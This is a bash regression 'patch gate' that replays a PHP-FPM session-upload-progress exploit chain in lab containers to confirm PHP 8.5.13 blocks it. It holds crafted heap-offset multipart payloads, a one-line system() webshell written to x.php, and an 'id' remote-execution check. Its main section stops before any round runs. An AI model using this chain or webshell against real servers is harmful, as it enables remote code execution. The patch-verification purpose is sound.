#!/bin/bash
# r41_patch_gate8513.sh -- 8.5.13 release-day fail-closed patch gate
# (curated release copy; lab-only).
#
# Copyright (c) 2026 The PHP2Shell research authors. MIT License (see LICENSE).
# LAB-ONLY: authorized lab targets only. This gate starts/stops containers,
# runs container commands, takes one gdb BG read and sends HTTP traffic; never
# point it at third-party systems. See ACCEPTABLE_USE.md and SECURITY.md.
#
# Release-day semantics: 8.5.13 must be published first (official
# php:8.5.13-fpm base); the first run is `RUNS=1 DIAG=1` (prints
# `GATE DIAG ... patch=fixed`, exit 0, NO verdict). Re-baseline, then RUNS=3.
# Exact-version strictness: a non-DIAG run requires exactly `8.5.13` (dev/RC
# builds are DIAG-only). `BG_VERIFIED`/`ALLOW_BG_UNVERIFIED=1` gate the BG
# level read; never treat an uncalibrated level as 0. `EXPECT_IMAGE` (image
# id) and `EXPECT_PAGE_SHA256` pin the image/page. Port 19145 (do not reuse
# 19143/19144). Build with labs/fpm/r46_build8513.sh; one-command pipeline:
# labs/fpm/r49_release_day_8513.sh. Evidence/checklist:
# docs/research/fpm-8513-readiness.md.
#
# r41_patch_gate8513.sh - fail-closed PHP FPM patch-gate for the 8.5.12 -> 8.5.13 step
#
# Status: PREPARED FOR RELEASE DAY (2026-10-31).  8.5.13 is not released yet.
#   First run MUST be a diagnostic (`RUNS=1 DIAG=1`): build the lab image from
#   the same recipe as the 8.5.12 gate (official php:8.5.13-fpm base) and
#   re-baseline the closed assertions.  Do NOT silently reuse the 8.5.12
#   numbers; the engine fix for 109618/109619 should still hold, but 8.5.13 may
#   also contain the CVE-2026-115560 serializer fix (separate issue, needs its
#   own check).
#
# Purpose
#   The 8.5.11 pure-HTTP chain (scripts/remote/r41_http_chain.sh, PROFILE=8511)
#   MUST NOT work on the patched 8.5.13 build.  This script runs the same
#   HTTP-only steps and emits a machine-readable verdict:
#
#     PATCH GATE: closed                      -> exit 0   (patched build; chain dead)
#     PATCH GATE: OPEN (REGRESSION)           -> exit 3   (unexpectedly exploitable)
#     PATCH GATE: ERROR ...                   -> exit 2   (config/instrument error,
#                                                          NEVER a gate pass)
#
#   For the positive control on the vulnerable 8.5.11 build the expected verdict
#   is reversed: "PATCH GATE: OPEN (expected on vulnerable)" / exit 3.
#
# Semantics that matter for the matrix
#   * PROFILE=8513 is explicit; unknown profiles exit 2 (a typo must not look
#     like a passing refuse case).
#   * exit 2 (config/arg/instrument error) is distinct from exit 0 (closed).
#   * one-shot gdb read of BG(unserialize) level is allowed for the gate
#     evidence only; the chain requests themselves stay pure HTTP.  If the read
#     is unavailable the level is reported as [UNVERIFIED].  8.5 BG offsets are
#     +0x368 (data) / +0x370 (level); verify with DIAG before trusting level=0.
#
# Reproducibility
#   RECREATE=1 IMAGE=<tag-or-digest> rebuilds the container from a pinned image
#   and a *mounted* php.ini copy with session.upload_progress.cleanup=Off
#   (never a docker-exec layer write).  EXPECT_IMAGE pins the image digest;
#   EXPECT_PAGE_SHA256 pins the lab page bytes.
#
# Usage examples (VM, after 8.5.13 release):
#   PROFILE=8513 CAL=p2s-fpm8513-128 PORT=19145 RUNS=1 DIAG=1 \
#   RECREATE=1 IMAGE=p2s-phpfpm-lab:8.5.13-gate \
#   EXPECT_IMAGE=sha256:<id> EXPECT_PAGE_SHA256=ca83aff9... \
#   bash scripts/remote/r41_patch_gate8513.sh          # diagnostic first
#   PROFILE=8513 ... RUNS=3 ...                       # then the gate
#   PROFILE=8511 CAL=p2s-gate-8511-ctl PORT=19137 RUNS=3 ... (positive control)
#
# Authorized lab use only.  Does not touch other containers.

set -u

CAL=${CAL:-p2s-fpm8512-128}
PORT=${PORT:-19131}
URL=${URL:-http://127.0.0.1:$PORT}
PROFILE=${PROFILE:-8512}
RUNS=${RUNS:-${ROUNDS:-3}}
IMAGE=${IMAGE:-}
EXPECT_IMAGE=${EXPECT_IMAGE:-}
EXPECT_PAGE_SHA256=${EXPECT_PAGE_SHA256:-ca83aff9fe0a0fd8400901a41f366746afe61dc627c7f4a767dff5139ce41829}
WWW_CONF=${WWW_CONF:-/home/ahost/fpm-lab/www-1.conf}
INI=${INI:-}
RECREATE=${RECREATE:-0}
GDB_BG=${GDB_BG:-1}
DIAG=${DIAG:-0}
ALLOW_BG_UNVERIFIED=${ALLOW_BG_UNVERIFIED:-0}
CODE=${CODE:-'<?php system($_GET[0]); ?>'}
SID_SP=${SID_SP:-acdbeef0acdbeef0acdbeef0acdbeef0}
SID_SR=${SID_SR:-ccccddddeeeeffff0000111122223333}
BND=----r41d
PRIME_Q=${PRIME_Q:-mb=114&pad=64}
WSH=${WSH:-$HOME/cve115560/gate/work}

case "$PROFILE" in
  # 8512/8513 keep the 8511 heap/PSG constants: docs/107 ?4.3 shows the 8.5.12
  # patch removes the *behavioral* preconditions (BG reset / fail-fast / parser
  # OOM), it does not move the heap geometry used by the HTTP-only chain (same
  # grow 7,050,470B observed).  Only the verdict is inverted.  8.5.13 DIAG must
  # confirm the same values before the gate is trusted.
  8511|8512|8513)
    P_S=0x97000; P_AIM=-103416; P_AIM_W=-109505; P_SESS_SP=7050470
    P_NL=8 ;;
  *)
    echo "PATCH GATE: ERROR unknown PROFILE=$PROFILE (use 8511|8512|8513); exit 2" >&2
    exit 2 ;;
esac
S=${S:-$P_S}
NL=${NL:-$P_NL}
AIM=${AIM:-$P_AIM}
AIM_W=${AIM_W:-$P_AIM_W}
SESS_SP_EXPECT=${SESS_SP_EXPECT:-$P_SESS_SP}
BND=$BND
mkdir -p "$WSH" || { echo "PATCH GATE: ERROR cannot create workdir $WSH" >&2; exit 2; }
rm -f "$WSH"/* 2>/dev/null || true

die() { echo "PATCH GATE: ERROR $*" >&2; exit 2; }
log() { echo "GATE $*"; }

# ---------------------------------------------------------------- lab pages
cat > "$WSH/_r41prime2.php" <<'PHP'
<?php /* _r41prime2.php */
$pad=(int)($_GET["pad"]??0);
$mb=(int)($_GET["mb"]??0);
$keep=array();
for($i=0;$i<$pad;$i++){ $keep[]=str_repeat("Z",4080); }
if($mb>0){ $keep[]=str_repeat("B",$mb*1048576); }
session_start();
echo "OK";
PHP
cat > "$WSH/_gateinfo.php" <<'PHP'
<?php
$keys = ["session.serialize_handler","session.upload_progress.enabled",
         "session.upload_progress.cleanup","session.save_path","session.save_handler",
         "memory_limit","max_memory_limit","memory_hard_limit_percent",
         "post_max_size","upload_max_filesize","display_errors","output_buffering",
         "max_input_vars","opcache.enable","session.use_strict_mode",
         "session.use_only_cookies","session.gc_probability",
         "session.upload_progress.freq","session.upload_progress.min_freq",
         "session.upload_progress.prefix","session.upload_progress.name"];
$all = ini_get_all(null, true);
echo "php_version|", PHP_VERSION, "|", PHP_VERSION, "\n";
foreach ($keys as $k) {
  $e = $all[$k] ?? null;
  echo $k, "|", ($e["global_value"] ?? "MISSING"), "|", ($e["local_value"] ?? "MISSING"), "\n";
}
echo "sapi|", PHP_SAPI, "|", PHP_SAPI, "\n";
PHP
cat > "$WSH/bg.gate.gdb" <<'GDB'
set pagination off
set confirm off
set height 0
set debuginfod enabled off
printf "BG_ATTACHED\n"
set $bg = (char*)&basic_globals
printf "BG_ADDR=%p\n", (void*)$bg
printf "BG_DATA=%p\n", (void*)*(void**)($bg+0x368)
printf "BG_LEVEL=%u\n", *(unsigned int*)($bg+0x370)
detach
quit
GDB

# ---------------------------------------------------------------- container
make_ini_copy() {
  local src=/home/ahost/fpm-lab/php-128m.ini
  local dst=$HOME/cve115560/gate/php-128m-gate.ini
  mkdir -p "$(dirname "$dst")"
  sed 's|^session.upload_progress.cleanup.*|session.upload_progress.cleanup = Off|' "$src" > "$dst"
  grep -q '^session.upload_progress.cleanup = Off' "$dst" || \
    echo 'session.upload_progress.cleanup = Off' >> "$dst"
  echo "$dst"
}

recreate_container() {
  [ -n "$IMAGE" ] || die "RECREATE=1 requires IMAGE="
  [ -n "$INI" ] || INI=$(make_ini_copy)
  [ -f "$INI" ] || die "INI not found: $INI"
  docker rm -f "$CAL" >/dev/null 2>&1 || true
  docker run -d --name "$CAL" -p "$PORT:80" \
    --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
    -v "$WWW_CONF:/usr/local/etc/php-fpm.d/www.conf:ro" \
    -v "$INI:/usr/local/etc/php/php.ini:ro" \
    "$IMAGE" >/dev/null || die "docker run failed for IMAGE=$IMAGE"
  log "RECREATED container=$CAL image=$IMAGE ini=$INI"
}

wait_up() {
  local i st
  for i in $(seq 1 100); do
    st=$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 "$URL/plain.php" 2>/dev/null || true)
    [ "$st" = "200" ] && return 0
    sleep 0.3
  done
  return 1
}
cpid() {
  docker exec "$CAL" sh -c 'for p in /proc/[0-9]*; do [ "$(cat "$p/comm" 2>/dev/null)" = "php-fpm" ] || continue; c=$(tr "\0" " " < "$p/cmdline" 2>/dev/null); case "$c" in *"pool www"*) echo "${p#/proc/}";; esac; done' 2>/dev/null | head -1
}
sess_size() { docker exec "$CAL" sh -c "stat -c %s /var/lib/php/sessions/sess_$1 2>/dev/null || echo MISSING" 2>/dev/null; }
inst_pages() {
  docker cp "$WSH/_r41prime2.php" "$CAL:/srv/www/_r41prime2.php" >/dev/null 2>&1 || return 1
  docker cp "$WSH/_gateinfo.php" "$CAL:/srv/www/_gateinfo.php" >/dev/null 2>&1 || return 1
  docker exec "$CAL" sh -c 'chown www-data:www-data /srv/www/_r41prime2.php /srv/www/_gateinfo.php' >/dev/null 2>&1 || true
}
clean_round() {
  docker restart "$CAL" >/dev/null 2>&1; sleep 2
  wait_up || return 1
  docker exec "$CAL" sh -c "rm -f /var/lib/php/sessions/sess_$SID_SR /var/lib/php/sessions/sess_$SID_SP /srv/www/x.php" >/dev/null 2>&1
  inst_pages || return 1
}
sha_of() { sha256sum "$1" 2>/dev/null | cut -d' ' -f1; }

# ---------------------------------------------------------------- config asserts
CONFIG_FAIL=""
CONFIG_LINES=""
config_assert() {
  local info; info=$(curl -s --max-time 10 "$URL/_gateinfo.php" 2>/dev/null || true)
  [ -n "$info" ] || { CONFIG_FAIL="$CONFIG_FAIL gateinfo_empty"; return 1; }
  local ver handler enabled cleanup savepath memlimit strict onlyc
  ver=$(echo "$info" | awk -F'|' '$1=="php_version"{print $2; exit}')
  handler=$(echo "$info" | awk -F'|' '$1=="session.serialize_handler"{print $3; exit}')
  enabled=$(echo "$info" | awk -F'|' '$1=="session.upload_progress.enabled"{print $3; exit}')
  cleanup=$(echo "$info" | awk -F'|' '$1=="session.upload_progress.cleanup"{print $3; exit}')
  savepath=$(echo "$info" | awk -F'|' '$1=="session.save_path"{print $3; exit}')
  memlimit=$(echo "$info" | awk -F'|' '$1=="memory_limit"{print $3; exit}')
  strict=$(echo "$info" | awk -F'|' '$1=="session.use_strict_mode"{print $3; exit}')
  onlyc=$(echo "$info" | awk -F'|' '$1=="session.use_only_cookies"{print $3; exit}')
  local savehandler postmax outbuf maxvars freq prefix upname
  savehandler=$(echo "$info" | awk -F'|' '$1=="session.save_handler"{print $3; exit}')
  postmax=$(echo "$info" | awk -F'|' '$1=="post_max_size"{print $3; exit}')
  outbuf=$(echo "$info" | awk -F'|' '$1=="output_buffering"{print $3; exit}')
  maxvars=$(echo "$info" | awk -F'|' '$1=="max_input_vars"{print $3; exit}')
  freq=$(echo "$info" | awk -F'|' '$1=="session.upload_progress.freq"{print $3; exit}')
  prefix=$(echo "$info" | awk -F'|' '$1=="session.upload_progress.prefix"{print $3; exit}')
  upname=$(echo "$info" | awk -F'|' '$1=="session.upload_progress.name"{print $3; exit}')
  CONFIG_LINES="php_version=$ver serialize_handler=$handler upload_progress.enabled=$enabled upload_progress.cleanup='${cleanup}' save_path=$savepath memory_limit=$memlimit use_strict_mode=$strict use_only_cookies=$onlyc save_handler=$savehandler post_max_size=$postmax output_buffering=$outbuf max_input_vars=$maxvars freq=$freq prefix=$prefix name=$upname"
  log "CONFIG web-context: $CONFIG_LINES"
  # full effective-ini dump: 8.5.11 vs 8.5.12 diff is recorded in the evidence
  echo "$info" | awk -F'|' 'NF>=3 && $1!="php_version" && $1!="sapi" {printf "GATE INI_WEB %s global=%s local=%s\n", $1, $2, $3}' | sort
  local sapi; sapi=$(echo "$info" | awk -F'|' '$1=="sapi"{print $2; exit}')
  log "SAPI=$sapi"
  case "$PROFILE" in
    8513) case "$ver" in 8.5.13*) : ;; *) CONFIG_FAIL="$CONFIG_FAIL php_version=$ver" ;; esac ;;
    8512) case "$ver" in 8.5.12*) : ;; *) CONFIG_FAIL="$CONFIG_FAIL php_version=$ver" ;; esac ;;
    8511) case "$ver" in 8.5.11*) : ;; *) CONFIG_FAIL="$CONFIG_FAIL php_version=$ver" ;; esac ;;
  esac
  [ "$handler" = "php" ] || CONFIG_FAIL="$CONFIG_FAIL serialize_handler=$handler"
  [ "$enabled" = "1" ] || CONFIG_FAIL="$CONFIG_FAIL upload_progress.enabled=$enabled"
  case "$cleanup" in ""|Off|0) : ;; *) CONFIG_FAIL="$CONFIG_FAIL cleanup=$cleanup" ;; esac
  [ "$memlimit" = "128M" ] || CONFIG_FAIL="$CONFIG_FAIL memory_limit=$memlimit"
  [ "$savepath" = "/var/lib/php/sessions" ] || CONFIG_FAIL="$CONFIG_FAIL save_path=$savepath"
  [ "$strict" = "0" ] || CONFIG_FAIL="$CONFIG_FAIL use_strict_mode=$strict"
  [ "$onlyc" = "1" ] || CONFIG_FAIL="$CONFIG_FAIL use_only_cookies=$onlyc"
  [ "$savehandler" = "files" ] || CONFIG_FAIL="$CONFIG_FAIL save_handler=$savehandler"
  [ "$postmax" = "8M" ] || CONFIG_FAIL="$CONFIG_FAIL post_max_size=$postmax"
  [ "$outbuf" = "0" ] || CONFIG_FAIL="$CONFIG_FAIL output_buffering=$outbuf"
  [ "$maxvars" = "1000" ] || CONFIG_FAIL="$CONFIG_FAIL max_input_vars=$maxvars"
  [ "$freq" = "1%" ] || CONFIG_FAIL="$CONFIG_FAIL upload_progress.freq=$freq"
  [ "$prefix" = "upload_progress_" ] || CONFIG_FAIL="$CONFIG_FAIL upload_progress.prefix=$prefix"
  [ "$upname" = "PHP_SESSION_UPLOAD_PROGRESS" ] || CONFIG_FAIL="$CONFIG_FAIL upload_progress.name=$upname"
  [ -z "$CONFIG_FAIL" ]
}

# ---------------------------------------------------------------- multipart builders
genprog() { # idx keylen
  python3 - "$WSH" "$1" "$2" "$BND" <<'PY'
import sys
W, idx, keylen, bnd = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4].encode()
key = (b"K" * keylen) + ("%04d" % idx).encode()
parts = [b"--" + bnd + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + key + b"\r\n"]
for j in range(20):
    fn = (b"F" * 100) + ("%04d%02d" % (idx, j)).encode() + b".bin"
    parts.append(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="f%02d"; filename="' % j + fn
                 + b'"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n')
parts.append(b"--" + bnd + b"--\r\n")
open(W + "/gb", "wb").write(b"".join(parts))
PY
}
mkprog() { # key
  python3 - "$WSH" "$1" "$BND" <<'PY'
import sys
W, key, bnd = sys.argv[1], sys.argv[2].encode(), sys.argv[3].encode()
parts = [b"--" + bnd + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + key + b"\r\n"]
parts.append(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="f"; filename="' + b"F" * 100
             + b'.bin"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n')
parts.append(b"--" + bnd + b"--\r\n")
open(W + "/progbody", "wb").write(b"".join(parts))
PY
}
mkbody() { # mode aim key
  python3 - "$WSH" "$BND" "$1" "$2" "$3" "$S" "$NL" <<'PY'
import sys, struct
W, bnd, mode, aim, key, S, nl = sys.argv[1], sys.argv[2].encode(), sys.argv[3], int(sys.argv[4]), sys.argv[5].encode(), int(sys.argv[6], 0), int(sys.argv[7])
parts = []
for i in range(nl):
    parts.append(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="L%03d"\r\n\r\n' % i + b"L" * 0xE00 + b"\r\n")
b = bytearray(S)
b[0x1FE8:0x1FF0] = struct.pack("<Q", 0)
if mode == "r2a":
    b[0x1AFE8:0x1AFF0] = struct.pack("<q", aim)
elif mode == "r3":
    b[0x1FF8:0x2008] = b"\x00" * 0x10
    b[0x2008:0x2018] = b"\x00" * 0x10
    b[0x2018:0x2020] = struct.pack("<Q", 15)
    b[0x2020:0x202F] = b"/srv/www/x.php\x00"
    b[0x1AFE8:0x1AFF0] = struct.pack("<q", aim)
assert len(b) == S
parts.append(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="BIG"\r\n\r\n' + bytes(b) + b"\r\n")
parts.append(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + key + b"\r\n")
parts.append(b"--" + bnd + b'\r\nContent-Disposition: form-data; name="f"; filename="a.bin"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n')
parts.append(b"--" + bnd + b"--\r\n")
open(W + "/stagebody", "wb").write(b"".join(parts))
PY
}
post() { # bodyfile sid
  curl -s -o /dev/null -w '%{http_code}' --max-time 180 \
    -H "Cookie: PHPSESSID=${2:-$SID_SR}" \
    -H "Content-Type: multipart/form-data; boundary=$BND" \
    --data-binary "@$1" "$URL/plain.php"
}

# ---------------------------------------------------------------- chain steps
grow_sp() {
  local i code
  docker exec "$CAL" sh -c "rm -f /var/lib/php/sessions/sess_$SID_SP" >/dev/null 2>&1
  for i in 1 2 3 4 5 6 7; do
    genprog "$i" 8
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 180 -H "Cookie: PHPSESSID=$SID_SP" \
      -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$WSH/gb" "$URL/plain.php")
    [ "$code" = "200" ] || { echo "GROW_FAIL i=$i code=$code"; return 1; }
  done
  genprog 8 7000000
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 180 -H "Cookie: PHPSESSID=$SID_SP" \
    -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$WSH/gb" "$URL/plain.php")
  [ "$code" = "200" ] || { echo "GROW_FAIL big code=$code"; return 1; }
  return 0
}
prime() { # restart -> grow SP -> restart -> GET prime
  local lb ld
  docker restart "$CAL" >/dev/null 2>&1; sleep 2; wait_up || { PRIME_ERR="restart1"; return 1; }
  grow_sp || { PRIME_ERR="grow"; return 1; }
  PRIME_SP=$(sess_size "$SID_SP")
  docker restart "$CAL" >/dev/null 2>&1; sleep 2; wait_up || { PRIME_ERR="restart2"; return 1; }
  PRIME_PID_BEFORE=$(cpid)
  lb=$(docker logs "$CAL" 2>&1 | wc -l)
  PRIME_CODE=$(curl -s -o "$WSH/primebody" -w '%{http_code}' --max-time 180 \
    -H "Cookie: PHPSESSID=$SID_SP" "$URL/_r41prime2.php?$PRIME_Q")
  PRIME_PID_AFTER=$(cpid)
  PRIME_BODY_BYTES=$(stat -c %s "$WSH/primebody" 2>/dev/null || echo ?)
  PRIME_BODY_SHA=$(sha_of "$WSH/primebody")
  ld=$(docker logs "$CAL" 2>&1 | tail -n +$((lb + 1)) 2>/dev/null)
  PRIME_FATAL=0
  echo "$ld" | grep -qE 'Allowed memory size.*exhausted|tried to allocate' && PRIME_FATAL=1
  PRIME_FATAL_LINE=$(echo "$ld" | grep -E 'Allowed memory size|tried to allocate' | head -1)
  PRIME_FATAL_RICH=0
  case "$PRIME_FATAL_LINE" in
    *"Allowed memory size"*"_r41prime2.php"*) PRIME_FATAL_RICH=1 ;;
  esac
  echo "$ld" > "$WSH/primelog"
  [ "$PRIME_CODE" = "500" ] || { PRIME_ERR="prime_code=$PRIME_CODE"; return 1; }
  return 0
}
bg_read() { # after prime, one-shot gdb read (gate evidence only)
  BG_LEVEL=""; BG_DATA=""; BG_ADDR=""
  [ "$GDB_BG" = "1" ] || { BG_LEVEL="DISABLED"; return 0; }
  local pid out
  pid=$(cpid)
  [ -n "$pid" ] || { BG_LEVEL="[UNVERIFIED]"; return 0; }
  docker cp "$WSH/bg.gate.gdb" "$CAL:/tmp/bg.gate.gdb" >/dev/null 2>&1 || { BG_LEVEL="[UNVERIFIED]"; return 0; }
  out=$(docker exec "$CAL" timeout 40 gdb -batch -q -p "$pid" -x /tmp/bg.gate.gdb 2>&1 || true)
  BG_ADDR=$(echo "$out" | sed -n 's/^BG_ADDR=\(.*\)$/\1/p' | head -1)
  BG_DATA=$(echo "$out" | sed -n 's/^BG_DATA=\(.*\)$/\1/p' | head -1)
  BG_LEVEL=$(echo "$out" | sed -n 's/^BG_LEVEL=\([0-9]*\).*/\1/p' | head -1)
  [ -n "$BG_LEVEL" ] || BG_LEVEL="[UNVERIFIED]"
  echo "$out" > "$WSH/bgread.log"
}
judge() {
  XSZ=$(docker exec "$CAL" sh -c 'stat -c %s /srv/www/x.php 2>/dev/null' 2>/dev/null | tr -d '\r')
  [ -n "$XSZ" ] || XSZ=MISSING
  JUDGE=$(curl -s --max-time 6 "$URL/x.php?0=id" 2>/dev/null | tr -d '\r')
  printf '%s' "$JUDGE" > "$WSH/judgeb"
  JUDGE_SHA=$(sha_of "$WSH/judgeb")
  NEGB=$(curl -s --max-time 6 "$URL/x.php" 2>/dev/null | tr -d '\r')
  printf '%s' "$NEGB" > "$WSH/negb"
  HEALTH=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$URL/plain.php" 2>/dev/null || true)
  CPID_AFTER=$(cpid)
  NEG_UID=0; case "$NEGB" in *uid=33*) NEG_UID=1 ;; esac
  RCE_UID=0; case "$JUDGE" in *uid=33*) RCE_UID=1 ;; esac
}

# ---------------------------------------------------------------- verdicts
run_round() { # n
  local n=$1 r1 r1k2 r2a r2ak2 r3
  clean_round || { RUN_STATUS=error; RUN_REASON="clean_round"; return; }
  mkprog "$CODE"; r1=$(post "$WSH/progbody"); SR_R1=$(sess_size "$SID_SR")
  prime || { RUN_STATUS=error; RUN_REASON="prime1:$PRIME_ERR"; return; }
  local p1=$PRIME_CODE f1=$PRIME_FATAL c1=0; [ "$PRIME_PID_BEFORE" = "$PRIME_PID_AFTER" ] && c1=1
  local sp1=$PRIME_SP b1=$PRIME_BODY_BYTES h1=$PRIME_BODY_SHA fr1=$PRIME_FATAL_RICH fl1="$PRIME_FATAL_LINE"
  bg_read
  mkbody r2a "$AIM" "$CODE"; r2a=$(post "$WSH/stagebody"); SR_2A=$(sess_size "$SID_SR")
  local i0=0 i0c; i0c=$(docker exec "$CAL" sh -c "grep -ac '|i:0;' /var/lib/php/sessions/sess_$SID_SR 2>/dev/null || true" 2>/dev/null | tr -d '\r')
  [ "${i0c:-0}" -gt 0 ] 2>/dev/null && i0=1
  mkprog K2; r1k2=$(post "$WSH/progbody")
  prime || { RUN_STATUS=error; RUN_REASON="prime2:$PRIME_ERR"; return; }
  local p2=$PRIME_CODE f2=$PRIME_FATAL c2=0; [ "$PRIME_PID_BEFORE" = "$PRIME_PID_AFTER" ] && c2=1
  mkbody r2a "$AIM" K2; r2ak2=$(post "$WSH/stagebody"); SR_2AK2=$(sess_size "$SID_SR")
  prime || { RUN_STATUS=error; RUN_REASON="prime3:$PRIME_ERR"; return; }
  local p3=$PRIME_CODE f3=$PRIME_FATAL c3=0; [ "$PRIME_PID_BEFORE" = "$PRIME_PID_AFTER" ] && c3=1
  mkbody r3 "$AIM_W" K3; r3=$(post "$WSH/stagebody")
  judge
  echo "GATE RUN $n: r1=$r1 sr1=${SR_R1}B prime1=$p1 fatal1=$f1 fatal1_rich=$fr1 child1=$c1 sp1=${sp1}B prime1_body=${b1}B prime1_sha=$h1 r2a=$r2a sr2a=${SR_2A}B sr2a_i0=$i0 r2ak2=$r2ak2 sr2ak2=${SR_2AK2}B r3=$r3 xphp=${XSZ}B judge='${JUDGE}' judge_sha=$JUDGE_SHA health=$HEALTH child_alive=$([ -n "$CPID_AFTER" ] && echo 1 || echo 0) bg_level=${BG_LEVEL:-?} bg_data=${BG_DATA:-?}"
  echo "GATE RUN $n PRIME_FATAL_LINE: ${fl1:-NONE}"
  # ---- OPEN signals (the vulnerable behavior)
  local open=0
  [ "$RCE_UID" = "1" ] && open=1
  if [ "$XSZ" != "MISSING" ] && [ "$XSZ" -gt 0 ] 2>/dev/null; then open=1; fi
  [ "$SR_2A" = "47" ] && open=1
  [ "$SR_2AK2" = "70" ] && open=1
  # ---- CLOSED conditions (patched behavior)
  local fail=""
  [ "$CONFIG_OK" = "1" ] || fail="$fail config"
  [ "$sp1" = "$SESS_SP_EXPECT" ] || fail="$fail growSP=$sp1"
  [ "$p1" = "500" ] || fail="$fail prime1=$p1"
  [ "$f1" = "1" ] || fail="$fail prime1_fatal=0"
  [ "$fr1" = "1" ] || fail="$fail prime1_fatal_rich=0"
  [ "$b1" = "0" ] || fail="$fail prime1_body=${b1}B"
  [ "$c1" = "1" ] || fail="$fail prime1_child_changed"
  [ "$r1" = "200" ] || fail="$fail r1=$r1"
  [ "$SR_R1" != "MISSING" ] && [ "$SR_R1" -gt 0 ] 2>/dev/null || fail="$fail sr1=$SR_R1"
  [ "$r2a" = "200" ] || fail="$fail r2a=$r2a"
  [ "$SR_2A" != "47" ] || fail="$fail sr2a=47(stale consumed)"
  [ "$i0" = "0" ] || fail="$fail sr2a_i0=1(stale consumed)"
  [ "$r1k2" = "200" ] || fail="$fail r1k2=$r1k2"
  [ "$r2ak2" = "200" ] || fail="$fail r2ak2=$r2ak2"
  [ "$SR_2AK2" != "70" ] || fail="$fail sr2ak2=70(stale consumed)"
  [ "$r3" = "200" ] || fail="$fail r3=$r3"
  [ "$XSZ" = "MISSING" ] || fail="$fail xphp=$XSZ"
  [ "$RCE_UID" = "0" ] || fail="$fail judge_uid33"
  [ "$HEALTH" = "200" ] || fail="$fail health=$HEALTH"
  [ -n "$CPID_AFTER" ] || fail="$fail worker_dead"
  # ---- per-run machine flags (aggregated in main)
  { [ "$f1" = "1" ] && [ "$fr1" = "1" ]; } || ALL_FATAL=0
  [ "$c1" = "1" ] || ALL_CHILD=0
  { [ "$r1" = "200" ] && [ "$SR_R1" != "MISSING" ] && [ "$SR_R1" -gt 0 ] 2>/dev/null; } || ALL_R1=0
  { [ "$SR_2A" != "47" ] && [ "$SR_2AK2" != "70" ] && [ "$i0" = "0" ]; } || ALL_SRUN=0
  { [ "$XSZ" = "MISSING" ] && [ "$RCE_UID" = "0" ]; } || ALL_NOPROOF=0
  local bgcheck=""
  case "$BG_LEVEL" in
    "") bgcheck="[UNVERIFIED]" ;;
    "[UNVERIFIED]") bgcheck="[UNVERIFIED]" ;;
    DISABLED) bgcheck="DISABLED" ;;
    *)
      case "$PROFILE" in
        8512|8513) [ "$BG_LEVEL" = "0" ] || bgcheck="unexpected_level=$BG_LEVEL" ;;
        8511) [ "$BG_LEVEL" = "1" ] || bgcheck="unexpected_level=$BG_LEVEL" ;;
      esac ;;
  esac
  [ -n "$bgcheck" ] && [ "${bgcheck#unexpected}" != "$bgcheck" ] && fail="$fail bg:$bgcheck"
  # BG must be *measured* for a closed verdict: a numeric level proves the
  # one-shot gdb read worked.  UNVERIFIED/DISABLED pass only with the explicit
  # ALLOW_BG_UNVERIFIED=1 escape hatch (release-day lab without gdb), never by
  # silently treating an unknown value as 0.
  BG_VERIFIED=0
  case "$BG_LEVEL" in
    [0-9]*) BG_VERIFIED=1 ;;
  esac
  if [ "$ALLOW_BG_UNVERIFIED" != "1" ] && [ "$BG_VERIFIED" != "1" ]; then
    fail="$fail bg_unverified=${BG_LEVEL:-?}"
  fi
  [ "$BG_VERIFIED" = "1" ] || ALL_BG=0
  if [ "$open" = "1" ]; then
    RUN_STATUS=open; RUN_REASON="open-signals"
  elif [ -n "$fail" ]; then
    RUN_STATUS=error; RUN_REASON="closed-asserts$fail"
  else
    RUN_STATUS=closed; RUN_REASON=""
  fi
  RUN_BG=$bgcheck
}

# ---------------------------------------------------------------- main
echo "== r41_patch_gate PROFILE=$PROFILE CAL=$CAL URL=$URL RUNS=$RUNS RECREATE=$RECREATE GDB_BG=$GDB_BG"
if [ "$RECREATE" = "1" ]; then
  recreate_container
fi
wait_up || die "container $CAL not answering at $URL"
inst_pages || die "cannot install lab pages"
CONFIG_OK=0
config_assert && CONFIG_OK=1
if [ "$CONFIG_OK" != "1" ]; then
  echo "PATCH GATE: ERROR config mismatch:$CONFIG_FAIL"
  exit 2
fi
IMAGE_ID=$(docker inspect --format '{{.Image}}' "$CAL" 2>/dev/null || echo UNKNOWN)
CONTAINER_ID=$(docker inspect --format '{{.Id}}' "$CAL" 2>/dev/null || echo UNKNOWN)
PHP_CLI=$(docker exec "$CAL" php -r 'echo PHP_VERSION;' 2>/dev/null || echo UNKNOWN)
log "IMAGE_ID=$IMAGE_ID"
log "CONTAINER_ID=$CONTAINER_ID"
log "PHP_CLI=$PHP_CLI"
# Version strictness: a gate verdict is only meaningful on the exact release.
# Dev/RC builds (8.5.13-dev, -RC1, ...) may be DIAG'd for re-baseline, but the
# gate itself refuses to emit closed/open on them.
if [ "$PROFILE" = "8513" ] && [ "$DIAG" != "1" ]; then
  case "$PHP_CLI" in
    8.5.13) : ;;
    *) echo "PATCH GATE: ERROR 8.5.13 gate requires exact PHP 8.5.13 (got ${PHP_CLI:-?}); use DIAG=1 to re-baseline a dev/RC build"; exit 2 ;;
  esac
fi
if [ -n "$EXPECT_IMAGE" ]; then
  [ "$IMAGE_ID" = "$EXPECT_IMAGE" ] || { echo "PATCH GATE: ERROR image digest mismatch (got $IMAGE_ID want $EXPECT_IMAGE)"; exit 2; }
  log "IMAGE_DIGEST_PIN=OK ($EXPECT_IMAGE)"
fi
